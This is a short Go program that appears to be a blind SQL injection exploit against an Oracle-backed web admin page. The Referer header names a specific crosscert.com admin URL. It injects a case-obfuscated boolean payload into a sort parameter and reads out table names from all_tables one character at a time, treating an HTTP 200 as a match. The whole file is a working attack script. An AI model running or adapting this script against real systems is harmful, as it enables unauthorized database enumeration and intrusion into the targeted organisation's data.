package main

import (
    "fmt"
    "bytes"
    "strconv"
    "net/http"
)

func main() {
    url := ""
    fmt.Println("URL:>", url)

    Loop0:
    for r := 1; r <100; r++ {
        Loop1 :
        for j := 1; j < 50; j++ {
            for i := 48; i < 123; i++ {
                var cnt = 48
                var s []int
                var jsonStr = []byte(`_search=false&nd=1593576229683&rows=20&page=1&sidx=
                    (sEleCt cASe wHen aScIi(sUbStr((sElEct table_name frOM (seLeCt rOwNuM r, table_name frOm all_tables) wHeRe r=`+strconv.Itoa(r)+`),
                    `+strconv.Itoa(j)+`,1)) bEtweEn `+strconv.Itoa(i)+` aNd `+strconv.Itoa(i)+`
                    tHen (sElEct 1 frOm dUal) eLse 1/0 eNd fRom dUal)&sord=`)
                req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))

                req.Header.Set("Cookie", "-")
                req.Header.Set("Host", "-")
                req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0")
                req.Header.Set("Accept", "application/json, text/javascript, */*")
                req.Header.Set("Accept-Language", "ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3")
                req.Header.Set("Accept-Encoding", "gzip, deflate")
                req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
                req.Header.Set("X-Requested-With", "XMLHttpRequest")
                req.Header.Set("Origin", "-")
                req.Header.Set("Connection", "close")
                req.Header.Set("Referer", "https://crmra.crosscert.com/admin/bid_edu_admin/Main.jsp")

                client := &http.Client{}
                resp, err := client.Do(req)
                if err != nil {
                    panic(err)
                }
                defer resp.Body.Close()

                if (resp.Status == "200 OK"){
                    //fmt.Println("response Status:", resp.Status)
                    fmt.Printf("%c", i)
                    s = append(s, i)

                    continue Loop1
                }else{
                    cnt++
                    if(cnt == 122){
                        continue Loop0
                    }
                }
            }
        }
            //fmt.Println("response Headers:", resp.Header)
        //body, _ := ioutil.ReadAll(resp.Body)
        //fmt.Println("response Body:", string(body))
    }
}